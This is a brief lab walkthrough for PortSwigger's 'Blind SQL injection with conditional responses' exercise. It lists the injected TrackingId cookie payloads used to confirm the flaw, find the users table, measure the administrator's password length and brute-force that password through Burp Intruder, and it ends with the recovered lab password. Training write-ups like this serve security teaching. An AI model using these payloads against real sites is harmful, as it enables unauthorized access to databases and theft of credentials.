#Lab: Blind SQL injection with conditional responses

#https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

We have TrackingId=gegY6UA7J8CkVXWR; when you do a request with this tracking id you get welcome back message.
But when you change it you don't see get welcome back message we will use this.
```bash
TrackingId=gegY6UA7J8CkVXWR'and 1=1--;

# welcome back

TrackingId=gegY6UA7J8CkVXWR'and 1=0--;
#no welcome back
```
```bash
#checking users table 
TrackingId=gegY6UA7J8CkVXWR'and (SELECT 'x' from users LIMIT 1)= 'x'--;
# welcome back
```
```bash
TrackingId=gegY6UA7J8CkVXWR'and (SELECT username from users where username = 'administrator')= 'administrator'--;

# welcome back
```
```bash
# Determining password length
gegY6UA7J8CkVXWR'and (SELECT username from users where username = 'administrator' and LENGTH(password)>2)= 'administrator'--;

# welcome back now send it to sniper and mark the 2. After that go to payloads set payload to numbers choose sequential
# set 1 to 50 and step = 1 and start attack check the response lenght and welcome back message.
# We had welcome back message until 20 so password length is 20.
```
```bash
#Brute Force Password
TrackingId=gegY6UA7J8CkVXWR'and (SELECT substring(password,1,1) from users where username = 'administrator')= 'a'--;

# mark first 1 after password and then that mark a. attack type clusterbomb.
# payload 1 will be numbers sequential 1 to 20 step=1.
# payload 2 will be brute forcer min and max lenght both 1.
#after that click on lenght higher the lenght means we got welcome message.
```
```bash
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
o h 2 d 3 s 6 s c n  l  4  1  b  8  4  x  r  a  d

oh2d3s6scnl41b84xrad
```
